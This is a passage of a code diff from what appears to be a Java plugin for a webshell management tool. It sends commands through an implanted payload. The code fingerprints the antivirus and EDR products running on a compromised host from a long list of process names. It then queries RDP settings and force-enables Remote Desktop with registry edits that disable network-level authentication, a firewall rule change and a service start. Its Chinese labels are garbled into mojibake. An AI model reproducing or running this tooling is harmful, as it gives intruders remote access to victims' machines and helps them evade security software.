-                String[] av = new String[]{"d_safe_manage.exe", "d¶Ü", "d_manage.exe", "d¶Ü", "pc.exe", "ÔÆËø¿Í»§¶Ë", "yunsuo_agent_service.exe", "ÔÆËø·şÎñ¶Ë", "yunsuo_agent_daemon.exe", "ÔÆËø·şÎñ¶Ë", "gov_defence_daemon.exe", "govdefence(Íø·Àg01)", "gov_defence_service.exe", "govdefence(Íø·Àg01)", "aliyundun.exe", "°¢ÀïÔÆ-ÔÆ¶Ü", "alisecguard.exe", "°¢ÀïÔÆ-ÔÆ¶Ü", "aliyundunupdate.exe", "°¢ÀïÔÆ-Éı¼¶·şÎñ", "aliyun_assist_service.exe", "°¢ÀïÔÆ-ÔÆ¼à¿Ø", "baradagent.exe", "ÌÚÑ¶ÔÆ-°²È«¼à¿Ø×é¼ş", "sgagent.exe", "ÌÚÑ¶ÔÆ-°²È«¼à¿Ø×é¼ş", "ydservice.exe", "ÌÚÑ¶ÔÆ-ÔÆ¾µÖ÷»ú°²È«", "ydlive.exe", "ÌÚÑ¶ÔÆ-ÔÆ¾µÖ÷»ú°²È«", "ydedr.exe", "ÌÚÑ¶ÔÆ-ÔÆ¾µÖ÷»ú°²È«", "360websafe.exe", "360Ö÷»úÎÀÊ¿", "qhsrv.exe", "360Ö÷»úÎÀÊ¿", "qhwebshellguard.exe", "360Ö÷»úÎÀÊ¿", "cloudhelper.exe", "°²È«¹·", "safedogtray.exe", "°²È«¹·", "safedogguardcenter.exe", "°²È«¹·", "safedogupdatecenter.exe", "°²È«¹·", "safedogsiteapache.exe", "ÍøÕ¾°²È«¹·(apache)", "safedogsiteiis.exe", "ÍøÕ¾°²È«¹·(iis)", "safedogserverui.exe", "·şÎñÆ÷°²È«¹·", "hws.exe", "»¤ÎÀÉñ¡¤ÈëÇÖ·À»¤ÏµÍ³", "hwsd.exe", "»¤ÎÀÉñ¡¤ÈëÇÖ·À»¤ÏµÍ³", "hws_ui.exe", "»¤ÎÀÉñ¡¤ÈëÇÖ·À»¤ÏµÍ³", "hwspanel.exe", "»¤ÎÀÉñ¡¤ÈëÇÖ·À»¤ÏµÍ³", "hipsdaemon.exe", "»ğÈŞ°²È«Èí¼ş", "hipstray.exe", "»ğÈŞ°²È«Èí¼ş", "hipslog.exe", "»ğÈŞ°²È«Èí¼ş", "hipsmain.exe", "»ğÈŞ°²È«Èí¼ş", "usysdiag.exe", "»ğÈŞ°²È«Èí¼ş", "wsctrl.exe", "»ğÈŞ°²È«Èí¼ş", "qqpcrtp.exe", "ÌÚÑ¶µçÄÔ¹Ü¼Ò", "qqpctray.exe", "ÌÚÑ¶µçÄÔ¹Ü¼Ò", "qqpcnetflow.exe", "ÌÚÑ¶µçÄÔ¹Ü¼Ò", "qqpcrealtimespeedup.exe", "ÌÚÑ¶µçÄÔ¹Ü¼Ò", "360sd.exe", "360É±¶¾", "360rp.exe", "360É±¶¾", "360safe.exe", "360°²È«ÎÀÊ¿", "360tray.exe", "360ÊµÊ±±£»¤", "liveupdate360.exe", "360¸üĞÂ³ÌĞò", "zhudongfangyu.exe", "360Ö÷¶¯·ÀÓù", "360safebox.exe", "360±£ÏÕÏäÖ÷³ÌĞò", "360skylarsvc.exe", "360ÌìÇæÖÕ¶Ë°²È«¹ÜÀíÏµÍ³", "wdswfsafe.exe", "360É±¶¾-Íø¶Ü", "QHActiveDefense.exe", "360¹ú¼Ê°æ", "360EntMisc.exe", "360(Ææ°²ĞÅ)ÌìÇæ", "360EntClient.exe", "ÌìÇæEDR Agent", "edr_sec_plan.exe", "ÉîĞÅ·şEDR Agent", "edr_monitor.exe", "ÉîĞÅ·şEDR Agent", "edr_agent.exe", "ÉîĞÅ·şEDR Agent", "ESCCControl.exe", "ÆôÃ÷ĞÇ³½Ìì«‘EDR Agent", "ESCC.exe", "ÆôÃ÷ĞÇ³½Ìì«‘EDR Agent", "ESAV.exe", "ÆôÃ÷ĞÇ³½Ìì«‘EDR Agent", "ESCCIndex.exe", "ÆôÃ÷ĞÇ³½Ìì«‘EDR Agent", "savmain.exe", "SophosÉ±¶¾", "savprogress.exe", "SophosÉ±¶¾", "Sophos UI.exe", "SophosÉ±¶¾", "SophosCleanM.exe", "SophosÉ±¶¾", "SophosFileScanner.exe", "SophosÉ±¶¾", "SophosOsquery.exe", "SophosÉ±¶¾", "SophosNtpService.exe", "SophosÉ±¶¾", "SophosFS.exe", "Sophos File Scanner Service", "SophosHealth.exe", "Sophos Health Service", "SophosSafestore64.exe", "Sophos Safestore Service", "SEDService.exe", "Sophos Endpoint Defense Service", "ALsvc.exe", "Sophos AutoUpdate Service", "SophosCleanM64.exe", "Sophos Clean Service", "McsAgent.exe", "Sophos MCS Agent", "McsClient.exe", "Sophos MCS Client", "SSPService.exe", "Sophos System Protection Service", "swc_service.exe", "Sophos Web Control Service", "SophosFIMService.exe", "Sophos FIM", "sdcservice.exe", "Sophos Device Control Service", "mbam.exe", "malwarebytesÉ±¶¾", "mbamtray.exe", "malwarebytesÉ±¶¾", "mbamservice.exe", "malwarebytesÉ±¶¾", "tmbmsrv.exe", "pc-cillinÇ÷ÊÆ·´²¡¶¾", "ntrtscan.exe", "pc-cillinÇ÷ÊÆ·´²¡¶¾", "vstskmgr.exe", "mcafee(Âó¿§·È)", "mcshield.exe", "mcafee(Âó¿§·È)", "mfevtps.exe", "mcafee(Âó¿§·È)", "mfeann.exe", "mcafee(Âó¿§·È)", "tbmon.exe", "mcafee(Âó¿§·È)", "shstat.exe", "mcafee(Âó¿§·È)", "mctray.exe", "mcafee(Âó¿§·È)", "udaterui.exe", "mcafee(Âó¿§·È)", "naprdmgr.exe", "mcafee(Âó¿§·È)", "engineserver.exe", "mcafee(Âó¿§·È)", "frameworkservice.exe", "mcafee(Âó¿§·È)", "avk.exe", "gdata°²È«·À»¤Èí¼ş", "gdscan.exe", "gdata°²È«·À»¤Èí¼ş", "avkwctl.exe", "gdata°²È«·À»¤Èí¼ş", "avkcl.exe", "gdata°²È«·À»¤Èí¼ş", "avkproxy.exe", "gdata°²È«·À»¤Èí¼ş", "avkbackupservice.exe", "gdata°²È«·À»¤Èí¼ş", "ccevtmgr.exe", "symantec(ÈüÃÅÌú¿Ë)", "ccsetmgr.exe", "symantec(ÈüÃÅÌú¿Ë)", "ccsvchst.exe", "symantec(ÈüÃÅÌú¿Ë) »ò norton(Åµ¶ÙÉ±¶¾)", "rtvscan.exe", "symantec(ÈüÃÅÌú¿Ë) »ò norton(Åµ¶ÙÉ±¶¾)", "smc.exe", "symantec(ÈüÃÅÌú¿Ë)", "smcgui.exe", "symantec(ÈüÃÅÌú¿Ë)", "snac.exe", "symantec(ÈüÃÅÌú¿Ë)", "symcorpui.exe", "symantec(ÈüÃÅÌú¿Ë)", "msmpeng.exe", "windows defender", "nissrv.exe", "windows defender", "mssense.exe", "windows defender", "msseces.exe", "windows defender", "mpcmdrun.exe", "windows defender", "msascui.exe", "windows defender", "msascuil.exe", "windows defender", "securityhealthservice.exe", "windows defender", "smartscreen.exe", "windows defender smartscreen", "avp.exe", "kaspersky(¿¨°ÍË¹»ù)", "kavfs.exe", "kaspersky(¿¨°ÍË¹»ù)", "klnagent.exe", "kaspersky(¿¨°ÍË¹»ù)", "kavtray.exe", "kaspersky(¿¨°ÍË¹»ù)", "kavfswp.exe", "kaspersky(¿¨°ÍË¹»ù)", "ekrn.exe", "eset nod32·À¶¾", "egui.exe", "eset nod32·À¶¾", "eshasrv.exe", "eset nod32·À¶¾", "eguiproxy.exe", "eset nod32·À¶¾", "avg.exe", "avgÉ±¶¾", "avgwdsvc.exe", "avgÉ±¶¾", "avastui.exe", "avast!5Ö÷³ÌĞò", "ashdisp.exe", "avastÍøÂç°²È«", "clamtray.exe", "clemwin free antivirus", "clamscan.exe", "clemwin free antivirus", "avcenter.exe", "avira(Ğ¡ºìÉ¡)", "avguard.exe", "avira(Ğ¡ºìÉ¡)", "avgnt.exe", "avira(Ğ¡ºìÉ¡)", "bddownloader.exe", "°Ù¶ÈÎÀÊ¿", "baidusafetray.exe", "°Ù¶ÈÎÀÊ¿", "baiduansvx.exe", "°Ù¶ÈÎÀÊ¿-Ö÷½ø³Ì", "baidusd.exe", "°Ù¶ÈÉ±¶¾-Ö÷³ÌĞò", "baidusdsvc.exe", "°Ù¶ÈÉ±¶¾-·şÎñ½ø³Ì", "baidusdtray.exe", "°Ù¶ÈÉ±¶¾-ÍĞÅÌ½ø³Ì", "f-prot.exe", "f-protÉ±¶¾", "vba32lder.exe", "vb32É±¶¾", "k7tsecurity.exe", "k7É±¶¾", "iptray.exe", "immunetÉ±¶¾", "cmctrayicon.exe", "cmcÉ±¶¾", "bkavservice.exe", "bkavÉ±¶¾", "nspupsvc.exe", "nprotectÉ±¶¾", "a2guard.exe", "a-squaredÉ±¶¾", "ad-watch.exe", "lavasoftÉ±¶¾", "unthreat.exe", "unthreatÉ±¶¾", "psafesystray.exe", "psafe·´²¡¶¾", "patray.exe", "ahnlab°²²©Ê¿É±¶¾", "v3svc.exe", "ahnlab°²²©Ê¿v3É±¶¾", "cleaner8.exe", "the cleanerÉ±¶¾", "mongoosagui.exe", "mongoosaÉ±¶¾", "secenter.exe", "bitdefenderÉ±¶¾", "ayagent.exe", "alyacº«¹ú½ºÄÒÉ±¶¾", "ksafe.exe", "½ğÉ½ÎÀÊ¿", "kvmonxp.exe", "½­ÃñÉ±¶¾", "ravmon.exe", "ÈğĞÇÉ±¶¾", "ravmond.exe", "ÈğĞÇÉ±¶¾", "kxescore.exe", "½ğÉ½¶¾°Ô", "kupdata.exe", "½ğÉ½¶¾°Ô", "kxetray.exe", "½ğÉ½¶¾°Ô", "kwsprotect64.exe", "½ğÉ½¶¾°Ô", "ksafetray.exe", "½ğÉ½ÎÀÊ¿", "knsdtray.exe", "¿ÉÅ£É±¶¾", "sbamsvc.exe", "vipreÉ±¶¾", "remupd.exe", "ĞÜÃ¨ÎÀÊ¿É±¶¾", "spidernt.exe", "dr.webÉ±¶¾", "quhlpsvc.exe", "quickhealÉ±¶¾", "fsavgui.exe", "f-secure±ùµºÉ±¶¾", "f-secure.exe", "f-secure±ùµºÉ±¶¾", "arcatasksservice.exe", "arcavirÉ±¶¾", "vsserv.exe", "bitdefender±ÈÌØèóµÂÉ±¶¾", "avwatchservice.exe", "virusfighterÉ±¶¾", "ns.exe", "nortonÅµ¶ÙÉ±¶¾", "ccapp.exe", "nortonÅµ¶ÙÉ±¶¾", "vptray.exe", "norton²¡¶¾·À»ğÇ½-¶ÜÅÆÍ¼±ê³ÌĞò", "npfmntor.exe", "nortonÉ±¶¾Èí¼şÏà¹Ø½ø³Ì", "ccregvfy.exe", "nortonÉ±¶¾Èí¼ş×ÔÉíÍêÕûĞÔ¼ì²é³ÌĞò", "sndsrvc.exe", "symantec sharedÅµ¶ÙÓÊ¼ş·À»ğÇ½Èí¼ş", "spbbcsvc.exe", "symantec sharedÅµ¶ÙÓÊ¼ş·À»ğÇ½Èí¼ş", "symlcsvc.exe", "symantec sharedÅµ¶ÙÓÊ¼ş·À»ğÇ½Èí¼ş", "coranticontrolcenter32.exe", "coranti2012É±¶¾", "cksoftshiedantivirus4.exe", "shield antivirusÉ±¶¾", "spywareterminatorshield.exe", "spywareterminatorÉ±¶¾", "usbkiller.exe", "uÅÌÉ±¶¾×¨¼Ò", "ast.exe", "³¬¼¶Ñ²¾¯", "fortitray.exe", "·ÉËş", "gg.exe", "¾Ş¶ÜÍøÓÎ°²È«¶Ü", "adam.exe", "ÂÌÓ¥°²È«¾«Áé", "kpfwtray.exe", "½ğÉ½ÍøïÚ", "beikesan.exe", "±´¿ÇÔÆ°²È«", "parmor.exe", "Ä¾Âí¿ËĞÇ", "iparmor.exe", "Ä¾Âí¿ËĞÇ", "kswebshield.exe", "½ğÉ½Íø¶Ü", "trojanhunter.exe", "Ä¾ÂíÁÔÊÖ", "webscanx.exe", "ÍøÂç²¡¶¾¿ËĞÇ", "ananwidget.exe", "Ä«Õß°²È«×¨¼Ò", "pfw.exe", "ÌìÍø·À»ğÇ½", "cfp.exe", "comodo¿ÆÄ¦¶à", "mpmon.exe", "Î¢µãÖ÷¶¯·ÀÓù", "rfwmain.exe", "ÈğĞÇ·À»ğÇ½", "sphinx.exe", "sphinx·À»ğÇ½", "vsmon.exe", "zonealarm·À»ğÇ½", "fyfirewall.exe", "·çÔÆ·À»ğÇ½", "acs.exe", "outpost·À»ğÇ½", "outpost.exe", "outpost·À»ğÇ½"};
+                String[] av = new String[]{"d_safe_manage.exe", "dç›¾", "d_manage.exe", "dç›¾", "pc.exe", "äº‘é”å®¢æˆ·ç«¯", "yunsuo_agent_service.exe", "äº‘é”æœåŠ¡ç«¯", "yunsuo_agent_daemon.exe", "äº‘é”æœåŠ¡ç«¯", "gov_defence_daemon.exe", "govdefence(ç½‘é˜²g01)", "gov_defence_service.exe", "govdefence(ç½‘é˜²g01)", "aliyundun.exe", "é˜¿é‡Œäº‘-äº‘ç›¾", "alisecguard.exe", "é˜¿é‡Œäº‘-äº‘ç›¾", "aliyundunupdate.exe", "é˜¿é‡Œäº‘-å‡çº§æœåŠ¡", "aliyun_assist_service.exe", "é˜¿é‡Œäº‘-äº‘ç›‘æ§", "baradagent.exe", "è…¾è®¯äº‘-å®‰å…¨ç›‘æ§ç»„ä»¶", "sgagent.exe", "è…¾è®¯äº‘-å®‰å…¨ç›‘æ§ç»„ä»¶", "ydservice.exe", "è…¾è®¯äº‘-äº‘é•œä¸»æœºå®‰å…¨", "ydlive.exe", "è…¾è®¯äº‘-äº‘é•œä¸»æœºå®‰å…¨", "ydedr.exe", "è…¾è®¯äº‘-äº‘é•œä¸»æœºå®‰å…¨", "360websafe.exe", "360ä¸»æœºå«å£«", "qhsrv.exe", "360ä¸»æœºå«å£«", "qhwebshellguard.exe", "360ä¸»æœºå«å£«", "cloudhelper.exe", "å®‰å…¨ç‹—", "safedogtray.exe", "å®‰å…¨ç‹—", "safedogguardcenter.exe", "å®‰å…¨ç‹—", "safedogupdatecenter.exe", "å®‰å…¨ç‹—", "safedogsiteapache.exe", "ç½‘ç«™å®‰å…¨ç‹—(apache)", "safedogsiteiis.exe", "ç½‘ç«™å®‰å…¨ç‹—(iis)", "safedogserverui.exe", "æœåŠ¡å™¨å®‰å…¨ç‹—", "hws.exe", "æŠ¤å«ç¥Â·å…¥ä¾µé˜²æŠ¤ç³»ç»Ÿ", "hwsd.exe", "æŠ¤å«ç¥Â·å…¥ä¾µé˜²æŠ¤ç³»ç»Ÿ", "hws_ui.exe", "æŠ¤å«ç¥Â·å…¥ä¾µé˜²æŠ¤ç³»ç»Ÿ", "hwspanel.exe", "æŠ¤å«ç¥Â·å…¥ä¾µé˜²æŠ¤ç³»ç»Ÿ", "hipsdaemon.exe", "ç«ç»’å®‰å…¨è½¯ä»¶", "hipstray.exe", "ç«ç»’å®‰å…¨è½¯ä»¶", "hipslog.exe", "ç«ç»’å®‰å…¨è½¯ä»¶", "hipsmain.exe", "ç«ç»’å®‰å…¨è½¯ä»¶", "usysdiag.exe", "ç«ç»’å®‰å…¨è½¯ä»¶", "wsctrl.exe", "ç«ç»’å®‰å…¨è½¯ä»¶", "qqpcrtp.exe", "è…¾è®¯ç”µè„‘ç®¡å®¶", "qqpctray.exe", "è…¾è®¯ç”µè„‘ç®¡å®¶", "qqpcnetflow.exe", "è…¾è®¯ç”µè„‘ç®¡å®¶", "qqpcrealtimespeedup.exe", "è…¾è®¯ç”µè„‘ç®¡å®¶", "360sd.exe", "360æ€æ¯’", "360rp.exe", "360æ€æ¯’", "360safe.exe", "360å®‰å…¨å«å£«", "360tray.exe", "360å®æ—¶ä¿æŠ¤", "liveupdate360.exe", "360æ›´æ–°ç¨‹åº", "zhudongfangyu.exe", "360ä¸»åŠ¨é˜²å¾¡", "360safebox.exe", "360ä¿é™©ç®±ä¸»ç¨‹åº", "360skylarsvc.exe", "360å¤©æ“ç»ˆç«¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ", "wdswfsafe.exe", "360æ€æ¯’-ç½‘ç›¾", "QHActiveDefense.exe", "360å›½é™…ç‰ˆ", "360EntMisc.exe", "360(å¥‡å®‰ä¿¡)å¤©æ“", "360EntClient.exe", "å¤©æ“EDR Agent", "edr_sec_plan.exe", "æ·±ä¿¡æœEDR Agent", "edr_monitor.exe", "æ·±ä¿¡æœEDR Agent", "edr_agent.exe", "æ·±ä¿¡æœEDR Agent", "ESCCControl.exe", "å¯æ˜æ˜Ÿè¾°å¤©ç£EDR Agent", "ESCC.exe", "å¯æ˜æ˜Ÿè¾°å¤©ç£EDR Agent", "ESAV.exe", "å¯æ˜æ˜Ÿè¾°å¤©ç£EDR Agent", "ESCCIndex.exe", "å¯æ˜æ˜Ÿè¾°å¤©ç£EDR Agent", "savmain.exe", "Sophosæ€æ¯’", "savprogress.exe", "Sophosæ€æ¯’", "Sophos UI.exe", "Sophosæ€æ¯’", "SophosCleanM.exe", "Sophosæ€æ¯’", "SophosFileScanner.exe", "Sophosæ€æ¯’", "SophosOsquery.exe", "Sophosæ€æ¯’", "SophosNtpService.exe", "Sophosæ€æ¯’", "SophosFS.exe", "Sophos File Scanner Service", "SophosHealth.exe", "Sophos Health Service", "SophosSafestore64.exe", "Sophos Safestore Service", "SEDService.exe", "Sophos Endpoint Defense Service", "ALsvc.exe", "Sophos AutoUpdate Service", "SophosCleanM64.exe", "Sophos Clean Service", "McsAgent.exe", "Sophos MCS Agent", "McsClient.exe", "Sophos MCS Client", "SSPService.exe", "Sophos System Protection Service", "swc_service.exe", "Sophos Web Control Service", "SophosFIMService.exe", "Sophos FIM", "sdcservice.exe", "Sophos Device Control Service", "mbam.exe", "malwarebytesæ€æ¯’", "mbamtray.exe", "malwarebytesæ€æ¯’", "mbamservice.exe", "malwarebytesæ€æ¯’", "tmbmsrv.exe", "pc-cillinè¶‹åŠ¿åç—…æ¯’", "ntrtscan.exe", "pc-cillinè¶‹åŠ¿åç—…æ¯’", "vstskmgr.exe", "mcafee(éº¦å’–å•¡)", "mcshield.exe", "mcafee(éº¦å’–å•¡)", "mfevtps.exe", "mcafee(éº¦å’–å•¡)", "mfeann.exe", "mcafee(éº¦å’–å•¡)", "tbmon.exe", "mcafee(éº¦å’–å•¡)", "shstat.exe", "mcafee(éº¦å’–å•¡)", "mctray.exe", "mcafee(éº¦å’–å•¡)", "udaterui.exe", "mcafee(éº¦å’–å•¡)", "naprdmgr.exe", "mcafee(éº¦å’–å•¡)", "engineserver.exe", "mcafee(éº¦å’–å•¡)", "frameworkservice.exe", "mcafee(éº¦å’–å•¡)", "avk.exe", "gdataå®‰å…¨é˜²æŠ¤è½¯ä»¶", "gdscan.exe", "gdataå®‰å…¨é˜²æŠ¤è½¯ä»¶", "avkwctl.exe", "gdataå®‰å…¨é˜²æŠ¤è½¯ä»¶", "avkcl.exe", "gdataå®‰å…¨é˜²æŠ¤è½¯ä»¶", "avkproxy.exe", "gdataå®‰å…¨é˜²æŠ¤è½¯ä»¶", "avkbackupservice.exe", "gdataå®‰å…¨é˜²æŠ¤è½¯ä»¶", "ccevtmgr.exe", "symantec(èµ›é—¨é“å…‹)", "ccsetmgr.exe", "symantec(èµ›é—¨é“å…‹)", "ccsvchst.exe", "symantec(èµ›é—¨é“å…‹) æˆ– norton(è¯ºé¡¿æ€æ¯’)", "rtvscan.exe", "symantec(èµ›é—¨é“å…‹) æˆ– norton(è¯ºé¡¿æ€æ¯’)", "smc.exe", "symantec(èµ›é—¨é“å…‹)", "smcgui.exe", "symantec(èµ›é—¨é“å…‹)", "snac.exe", "symantec(èµ›é—¨é“å…‹)", "symcorpui.exe", "symantec(èµ›é—¨é“å…‹)", "msmpeng.exe", "windows defender", "nissrv.exe", "windows defender", "mssense.exe", "windows defender", "msseces.exe", "windows defender", "mpcmdrun.exe", "windows defender", "msascui.exe", "windows defender", "msascuil.exe", "windows defender", "securityhealthservice.exe", "windows defender", "smartscreen.exe", "windows defender smartscreen", "avp.exe", "kaspersky(å¡å·´æ–¯åŸº)", "kavfs.exe", "kaspersky(å¡å·´æ–¯åŸº)", "klnagent.exe", "kaspersky(å¡å·´æ–¯åŸº)", "kavtray.exe", "kaspersky(å¡å·´æ–¯åŸº)", "kavfswp.exe", "kaspersky(å¡å·´æ–¯åŸº)", "ekrn.exe", "eset nod32é˜²æ¯’", "egui.exe", "eset nod32é˜²æ¯’", "eshasrv.exe", "eset nod32é˜²æ¯’", "eguiproxy.exe", "eset nod32é˜²æ¯’", "avg.exe", "avgæ€æ¯’", "avgwdsvc.exe", "avgæ€æ¯’", "avastui.exe", "avast!5ä¸»ç¨‹åº", "ashdisp.exe", "avastç½‘ç»œå®‰å…¨", "clamtray.exe", "clemwin free antivirus", "clamscan.exe", "clemwin free antivirus", "avcenter.exe", "avira(å°çº¢ä¼)", "avguard.exe", "avira(å°çº¢ä¼)", "avgnt.exe", "avira(å°çº¢ä¼)", "bddownloader.exe", "ç™¾åº¦å«å£«", "baidusafetray.exe", "ç™¾åº¦å«å£«", "baiduansvx.exe", "ç™¾åº¦å«å£«-ä¸»è¿›ç¨‹", "baidusd.exe", "ç™¾åº¦æ€æ¯’-ä¸»ç¨‹åº", "baidusdsvc.exe", "ç™¾åº¦æ€æ¯’-æœåŠ¡è¿›ç¨‹", "baidusdtray.exe", "ç™¾åº¦æ€æ¯’-æ‰˜ç›˜è¿›ç¨‹", "f-prot.exe", "f-protæ€æ¯’", "vba32lder.exe", "vb32æ€æ¯’", "k7tsecurity.exe", "k7æ€æ¯’", "iptray.exe", "immunetæ€æ¯’", "cmctrayicon.exe", "cmcæ€æ¯’", "bkavservice.exe", "bkavæ€æ¯’", "nspupsvc.exe", "nprotectæ€æ¯’", "a2guard.exe", "a-squaredæ€æ¯’", "ad-watch.exe", "lavasoftæ€æ¯’", "unthreat.exe", "unthreatæ€æ¯’", "psafesystray.exe", "psafeåç—…æ¯’", "patray.exe", "ahnlabå®‰åšå£«æ€æ¯’", "v3svc.exe", "ahnlabå®‰åšå£«v3æ€æ¯’", "cleaner8.exe", "the cleaneræ€æ¯’", "mongoosagui.exe", "mongoosaæ€æ¯’", "secenter.exe", "bitdefenderæ€æ¯’", "ayagent.exe", "alyacéŸ©å›½èƒ¶å›Šæ€æ¯’", "ksafe.exe", "é‡‘å±±å«å£«", "kvmonxp.exe", "æ±Ÿæ°‘æ€æ¯’", "ravmon.exe", "ç‘æ˜Ÿæ€æ¯’", "ravmond.exe", "ç‘æ˜Ÿæ€æ¯’", "kxescore.exe", "é‡‘å±±æ¯’éœ¸", "kupdata.exe", "é‡‘å±±æ¯’éœ¸", "kxetray.exe", "é‡‘å±±æ¯’éœ¸", "kwsprotect64.exe", "é‡‘å±±æ¯’éœ¸", "ksafetray.exe", "é‡‘å±±å«å£«", "knsdtray.exe", "å¯ç‰›æ€æ¯’", "sbamsvc.exe", "vipreæ€æ¯’", "remupd.exe", "ç†ŠçŒ«å«å£«æ€æ¯’", "spidernt.exe", "dr.webæ€æ¯’", "quhlpsvc.exe", "quickhealæ€æ¯’", "fsavgui.exe", "f-secureå†°å²›æ€æ¯’", "f-secure.exe", "f-secureå†°å²›æ€æ¯’", "arcatasksservice.exe", "arcaviræ€æ¯’", "vsserv.exe", "bitdefenderæ¯”ç‰¹æ¢µå¾·æ€æ¯’", "avwatchservice.exe", "virusfighteræ€æ¯’", "ns.exe", "nortonè¯ºé¡¿æ€æ¯’", "ccapp.exe", "nortonè¯ºé¡¿æ€æ¯’", "vptray.exe", "nortonç—…æ¯’é˜²ç«å¢™-ç›¾ç‰Œå›¾æ ‡ç¨‹åº", "npfmntor.exe", "nortonæ€æ¯’è½¯ä»¶ç›¸å…³è¿›ç¨‹", "ccregvfy.exe", "nortonæ€æ¯’è½¯ä»¶è‡ªèº«å®Œæ•´æ€§æ£€æŸ¥ç¨‹åº", "sndsrvc.exe", "symantec sharedè¯ºé¡¿é‚®ä»¶é˜²ç«å¢™è½¯ä»¶", "spbbcsvc.exe", "symantec sharedè¯ºé¡¿é‚®ä»¶é˜²ç«å¢™è½¯ä»¶", "symlcsvc.exe", "symantec sharedè¯ºé¡¿é‚®ä»¶é˜²ç«å¢™è½¯ä»¶", "coranticontrolcenter32.exe", "coranti2012æ€æ¯’", "cksoftshiedantivirus4.exe", "shield antivirusæ€æ¯’", "spywareterminatorshield.exe", "spywareterminatoræ€æ¯’", "usbkiller.exe", "uç›˜æ€æ¯’ä¸“å®¶", "ast.exe", "è¶…çº§å·¡è­¦", "fortitray.exe", "é£å¡”", "gg.exe", "å·¨ç›¾ç½‘æ¸¸å®‰å…¨ç›¾", "adam.exe", "ç»¿é¹°å®‰å…¨ç²¾çµ", "kpfwtray.exe", "é‡‘å±±ç½‘é•–", "beikesan.exe", "è´å£³äº‘å®‰å…¨", "parmor.exe", "æœ¨é©¬å…‹æ˜Ÿ", "iparmor.exe", "æœ¨é©¬å…‹æ˜Ÿ", "kswebshield.exe", "é‡‘å±±ç½‘ç›¾", "trojanhunter.exe", "æœ¨é©¬çŒæ‰‹", "webscanx.exe", "ç½‘ç»œç—…æ¯’å…‹æ˜Ÿ", "ananwidget.exe", "å¢¨è€…å®‰å…¨ä¸“å®¶", "pfw.exe", "å¤©ç½‘é˜²ç«å¢™", "cfp.exe", "comodoç§‘æ‘©å¤š", "mpmon.exe", "å¾®ç‚¹ä¸»åŠ¨é˜²å¾¡", "rfwmain.exe", "ç‘æ˜Ÿé˜²ç«å¢™", "sphinx.exe", "sphinxé˜²ç«å¢™", "vsmon.exe", "zonealarmé˜²ç«å¢™", "fyfirewall.exe", "é£äº‘é˜²ç«å¢™", "acs.exe", "outposté˜²ç«å¢™", "outpost.exe", "outposté˜²ç«å¢™"};
 
                 for(int i = 0; i < av.length; ++i) {
                     int find = cmdResult.indexOf(av[i]);
@@ -797,7 +800,7 @@ public abstract class NewCmd implements Plugin {
                 }
 
                 if (NewCmd.this.cmdTextArea.getText().equals("")) {
-                    NewCmd.this.cmdTextArea.setText("¶Ô·½Ã»ÓĞ·À»¤Èí¼ş");
+                NewCmd.this.cmdTextArea.setText("");
                 }
 
             }
@@ -814,31 +817,14 @@ public abstract class NewCmd implements Plugin {
         (new Thread() {
             public void run() {
                 NewCmd.this.cmdTextArea.setText("");
-                String resultObj = null;
-
                 try {
-                    resultObj = NewCmd.this.payload.execCommand("cmd.exe /c tasklist /svc | find \"Ter\"");
-                    System.out.println(resultObj);
+                    String deny = NewCmd.this.payload.execCommand("cmd.exe /c reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections");
+                    String port = NewCmd.this.payload.execCommand("cmd.exe /c reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber");
+                    String svc = NewCmd.this.payload.execCommand("cmd.exe /c sc query TermService");
+                    NewCmd.this.cmdTextArea.setText((deny == null ? "" : deny) + "\n" + (port == null ? "" : port) + "\n" + (svc == null ? "" : svc));
                 } catch (Exception var5) {
-                    throw new RuntimeException(var5);
+                    NewCmd.this.cmdTextArea.setText(String.valueOf(var5.getMessage()));
                 }
-
-                String getSignInfo = resultObj.substring(resultObj.indexOf(".exe") + 4, resultObj.indexOf("TermService"));
-                getSignInfo = getSignInfo.trim();
-
-                try {
-                    System.out.println(getSignInfo);
-                    resultObj = NewCmd.this.payload.execCommand("cmd.exe /c netstat -ano  | find \"" + getSignInfo + "\"");
-                } catch (Exception var4) {
-                    throw new RuntimeException(var4);
-                }
-
-                if (resultObj != null && !"".equals(resultObj)) {
-                    NewCmd.this.cmdTextArea.setText("PID:" + getSignInfo + "\n" + resultObj);
-                } else {
-                    NewCmd.this.cmdTextArea.setText("Î´¿ªÆôrdp¶Ë¿Ú");
-                }
-
             }
         }).start();
     }
@@ -847,12 +833,17 @@ public abstract class NewCmd implements Plugin {
         (new Thread() {
             public void run() {
                 NewCmd.this.cmdTextArea.setText("");
-                String path = NewCmd.this.payload.currentDir();
-                byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/StartRdp.exe"));
-                NewCmd.this.payload.uploadFile(path + "\\StartRdp.exe", pe);
-                String txt = NewCmd.this.payload.execCommand(path + "StartRdp.exe");
-                NewCmd.this.payload.deleteFile(path + "\\StartRdp.exe");
-                NewCmd.this.cmdTextArea.setText(txt);
+                String cmd = "cmd.exe /c "
+                        + "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+                        + " & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f"
+                        + " & netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes"
+                        + " & net start TermService";
+                try {
+                    String txt = NewCmd.this.payload.execCommand(cmd);
+                    NewCmd.this.cmdTextArea.setText(txt == null ? "" : txt);
+                } catch (Exception ex) {
+                    NewCmd.this.cmdTextArea.setText(String.valueOf(ex.getMessage()));
+                }
             }
         }).start();
     }
@@ -860,10 +851,16 @@ public abstract class NewCmd implements Plugin {
     private void stoprdpButtonClick(ActionEvent actionEvent) {
         (new Thread() {
             public void run() {
-                byte[] a = NewCmd.this.payload.getPayload();
                 NewCmd.this.cmdTextArea.setText("");
-                String text = NewCmd.this.payload.execCommand("cmd.exe /c REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f");
-                NewCmd.this.cmdTextArea.setText(text);
+                String cmd = "cmd.exe /c "
